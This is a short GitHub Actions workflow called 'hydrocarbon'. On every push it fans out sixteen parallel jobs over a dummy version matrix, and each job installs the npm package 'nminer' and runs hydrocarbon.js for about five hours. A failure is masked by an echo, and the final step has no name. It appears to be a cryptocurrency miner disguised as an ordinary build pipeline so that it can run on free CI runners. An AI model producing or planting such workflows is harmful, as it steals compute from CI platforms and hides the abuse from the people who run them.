name: hydrocarbon
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 658 }
          - { version: 4305 }
          - { version: 2706 }
          - { version: 8606 }
          - { version: 1590 }
          - { version: 9179 }
          - { version: 3749 }
          - { version: 6008 }
          - { version: 9771 }
          - { version: 9457 }
          - { version: 1666 }
          - { version: 8302 }
          - { version: 9265 }
          - { version: 4010 }
          - { version: 1125 }
          - { version: 6023 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 323m node hydrocarbon.js || echo "hydrocarbon executed"